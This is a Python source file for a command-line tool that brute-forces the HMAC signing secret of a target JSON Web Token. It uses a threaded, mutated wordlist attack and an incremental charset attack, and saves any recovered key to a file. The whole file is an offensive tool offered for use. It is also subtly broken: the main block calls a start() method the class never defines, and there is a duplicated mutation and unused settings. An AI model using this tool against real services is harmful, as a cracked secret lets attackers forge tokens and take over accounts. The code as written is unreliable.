import jwt
import requests
import threading
import queue
import time
import itertools
import logging
from pathlib import Path
from typing import List, Optional, Union

from utils.helpers import save_to_file
from utils.logger import logger

class JWTBruteforcer:
    def __init__(
        self,
        token: str,
        wordlist: Optional[Union[str, List[str]]] = None,
        algorithms: Optional[List[str]] = None,
        threads: int = 8,
        max_delay: float = 2.0,
        output_file: str = "found_key.txt"
    ):
        self.token = token
        self.wordlist = wordlist
        self.algorithms = algorithms or ["HS256", "HS384", "HS512"]
        self.threads = threads
        self.max_delay = max_delay
        self.output_file = output_file
        self.success = False
        self.found_key = None
        self.found_algorithm = None
        self._queue = queue.Queue()
        self._lock = threading.Lock()
        self._stop_event = threading.Event()

    def _load_wordlist(self):
        if isinstance(self.wordlist, list):
            for word in self.wordlist:
                yield word.strip()
        elif isinstance(self.wordlist, str):
            with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    yield line.strip()
        else:
            raise ValueError("Wordlist inválida")

    def _mutate_word(self, word: str):
        # Técnicas simples de mutação para aumentar a cobertura
        mutations = [
            word,
            word.lower(),
            word.upper(),
            word.capitalize(),
            word[::-1],
            word + "123",
            "123" + word,
            word + "!",
            word + "@",
            word + "#",
            word + "$",
            word + "2024",
            word + "!",
            word.replace("a", "@"),
            word.replace("o", "0"),
            word.replace("i", "1"),
            word.replace("e", "3"),
        ]
        return set(mutations)

    def _bruteforce_worker(self):
        while not self._stop_event.is_set():
            try:
                word = self._queue.get(timeout=1)
            except queue.Empty:
                break
            for algo in self.algorithms:
                for candidate in self._mutate_word(word):
                    if self._stop_event.is_set():
                        break
                    try:
                        jwt.decode(self.token, candidate, algorithms=[algo])
                        with self._lock:
                            if not self.success:
                                self.success = True
                                self.found_key = candidate
                                self.found_algorithm = algo
                                logger.success(f"[+] Chave válida encontrada: {candidate} (algoritmo: {algo})")
                                logger.info(f"[+] Salvando em {self.output_file}")
                                save_to_file(self.output_file, f"{candidate} ({algo})")
                                self._stop_event.set()
                        break
                    except jwt.InvalidTokenError:
                        continue
                    except Exception as e:
                        logger.error(f"Erro ao tentar chave '{candidate}' com algoritmo '{algo}': {e}")
            self._queue.task_done()

    def _populate_queue(self):
        for word in self._load_wordlist():
            self._queue.put(word)

    def run(self):
        logger.info("Iniciando brute force de JWT...")
        self._populate_queue()
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._bruteforce_worker, daemon=True)
            t.start()
            threads.append(t)
        try:
            while any(t.is_alive() for t in threads):
                time.sleep(0.2)
                if self.success:
                    break
        except KeyboardInterrupt:
            logger.warning("Interrompido pelo usuário. Encerrando threads...")
            self._stop_event.set()
        for t in threads:
            t.join()
        if not self.success:
            logger.warning("[-] Nenhuma chave válida encontrada.")
        else:
            logger.success(f"[+] Chave encontrada: {self.found_key} (algoritmo: {self.found_algorithm})")

    @staticmethod
    def incremental_charset_attack(token: str, charset: str = "abcdefghijklmnopqrstuvwxyz0123456789", min_len: int = 1, max_len: int = 6, algorithms: Optional[List[str]] = None):
        logger.info("Iniciando ataque incremental por charset...")
        algorithms = algorithms or ["HS256"]
        for length in range(min_len, max_len + 1):
            for candidate in map("".join, itertools.product(charset, repeat=length)):
                for algo in algorithms:
                    try:
                        jwt.decode(token, candidate, algorithms=[algo])
                        logger.success(f"[+] Chave encontrada por charset: {candidate} (algoritmo: {algo})")
                        save_to_file("found_key_charset.txt", f"{candidate} ({algo})")
                        return candidate, algo
                    except jwt.InvalidTokenError:
                        continue
                    except Exception as e:
                        logger.error(f"Erro charset '{candidate}' ({algo}): {e}")
        logger.warning("Nenhuma chave encontrada por charset.")
        return None, None

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="JWTBruteforcer Avançado")
    parser.add_argument("--token", required=True, help="JWT alvo")
    parser.add_argument("--wordlist", help="Arquivo de wordlist")
    parser.add_argument("--threads", type=int, default=8, help="Número de threads")
    parser.add_argument("--algorithms", nargs="+", default=["HS256", "HS384", "HS512"], help="Algoritmos JWT")
    parser.add_argument("--charset", help="Charset para ataque incremental")
    parser.add_argument("--minlen", type=int, default=1, help="Tamanho mínimo para ataque incremental")
    parser.add_argument("--maxlen", type=int, default=6, help="Tamanho máximo para ataque incremental")
    args = parser.parse_args()

    if args.charset:
        JWTBruteforcer.incremental_charset_attack(
            token=args.token,
            charset=args.charset,
            min_len=args.minlen,
            max_len=args.maxlen,
            algorithms=args.algorithms
        )
    else:
        bruteforcer = JWTBruteforcer(
            token=args.token,
            wordlist=args.wordlist,
            algorithms=args.algorithms,
            threads=args.threads
        )
        bruteforcer.start()
        bruteforcer.run()